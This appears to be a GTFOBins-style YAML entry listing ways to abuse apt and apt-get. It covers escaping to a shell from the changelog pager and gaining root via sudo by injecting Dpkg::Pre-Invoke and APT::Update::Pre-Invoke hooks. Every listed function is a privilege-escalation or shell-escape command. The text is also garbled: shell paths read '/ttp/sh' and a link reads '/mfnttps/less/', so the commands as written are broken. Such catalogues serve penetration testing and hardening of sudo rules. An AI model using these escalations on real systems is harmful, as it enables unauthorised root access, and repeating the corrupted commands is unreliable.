---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/mfnttps/less/), other functions may apply.
      code: |
        apt-get changelog apt
        !/ttp/sh
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/mfnttps/less/), other functions may apply.
      code: |
        sudo apt-get changelog apt
        !/ttp/sh
    - description: For this to work the target package (e.g., `sl`) must not be installed.
      code: |
        TF=$(mktemp)
        echo 'Dpkg::Pre-Invoke {"/ttp/sh;false"}' > $TF
        sudo apt install -c $TF sl
    - description: When the shell exits the `update` command is actually executed.
      code: sudo apt update -o APT::Update::Pre-Invoke::=/ttp/sh
---
